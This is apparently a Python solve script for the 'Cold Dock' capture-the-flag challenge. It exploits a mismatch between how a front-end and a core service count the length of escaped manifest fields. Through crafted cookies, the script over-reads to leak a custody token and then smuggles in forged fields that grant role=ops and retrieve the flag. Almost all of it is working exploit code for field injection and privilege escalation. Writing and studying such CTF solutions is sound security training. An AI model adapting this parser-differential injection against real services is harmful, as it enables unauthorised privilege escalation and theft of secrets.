#!/usr/bin/env python3
"""
Cold Dock (CryoVault Finals 2026) - solve script.

Bug: Frostline Edge writes CCIP manifests with revision-1.2 semantics while
labelling them revision 1.4.  In 1.4 the field's VLEN counts the *unfolded*
value length, but Edge writes VLEN = length of the folded (%-escaped) value.
So a label full of '.' (folded to %2E) makes the core over-read the label
value straight through the fixed fields that follow it (role/user/jti/exp/
custody/target header) and resume parsing at an attacker-chosen offset inside
the attacker-controlled `cold_target` value.

We use that to smuggle a complete, internally consistent field sequence into
the manifest: role=ops, plus a custody token.  The custody token is leaked
from a first (legitimate) thaw whose label over-read swallows the real
`C ... custody` field and the core echoes it back as the consignment label.
Finally we thaw `cold_seal` with the forged role and the leaked custody.

Target: https://isfcrpesu-cold-dock.chals.io/
"""

import os
import re
import sys

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://isfcrpesu-cold-dock.chals.io"
FLAG_RE = re.compile(r"isfcr\{[^}]+\}")


def field(tag, name, value):
    # Edge writes plain (unescaped) values for our injected fields, so the
    # encoded length equals the decoded length.
    assert all(c not in " %.~" for c in value), value
    return "%s%02x%02x%s%s" % (tag, len(name), len(value), name, value)


def main():
    s = requests.Session()

    # Learn our dock handle (session cookie is minted on first contact).
    r = s.get(BASE + "/ops/heartbeat", timeout=15)
    m = re.search(r"edge: session ([a-z0-9]+)", r.text)
    if not m:
        raise SystemExit("could not obtain session: %r" % r.text)
    user = m.group(1)
    print("[*] dock handle: %s" % user)

    def send(injected, m_fill):
        # Label = n dots -> folded length 3n; core expects 3n *unfolded* bytes,
        # so it consumes n dots + 2n further bytes, i.e. 2n bytes of the tail.
        # Landing point relative to the 'R' tag is 2n.  The target value starts
        # 117 bytes in, so choose 2n = 117 + m_fill.
        n = (117 + m_fill) // 2
        assert 2 * n == 117 + m_fill and 3 * n <= 192
        target = "A" * m_fill + injected
        assert len(target) <= 160 and len(injected) > m_fill
        return s.post(
            BASE + "/ops/thaw",
            cookies={"cold_target": target, "cold_label": "." * n},
            timeout=15,
        )

    # 1) Leak the custody token: label over-read swallows the real
    #    "C0710custody<16 hex>" field; the success message echoes the label.
    leak = (
        field("R", "role", "viewer")
        + field("U", "user", user)
        + field("J", "jti", os.urandom(8).hex())
        + field("X", "exp", "2000000000")
        + field("T", "target", "dock_00")
    )
    r = send(leak, 5)
    if r.status_code != 200:
        raise SystemExit("leak failed: %d %r" % (r.status_code, r.text))
    print("[*] leak response: %s" % r.text.splitlines()[0][:120] + " ...")
    cm = re.search(r"custody([0-9a-f]{16})", r.text)
    if not cm:
        raise SystemExit("custody not found in echo")
    custody = cm.group(1)
    print("[*] leaked custody token: %s" % custody)

    # 2) Forge the manifest: role=ops + valid custody + target=cold_seal.
    payload = (
        field("R", "role", "ops")
        + field("U", "user", user)
        + field("J", "jti", os.urandom(8).hex())
        + field("X", "exp", "2000000000")
        + field("C", "custody", custody)
        + field("T", "target", "cold_seal")
    )
    r = send(payload, 5)
    print("[*] thaw response: %d %s" % (r.status_code, r.text.strip()))
    fm = FLAG_RE.search(r.text)
    if not fm:
        raise SystemExit("no flag in response")
    print("[+] FLAG: %s" % fm.group(0))


if __name__ == "__main__":
    main()
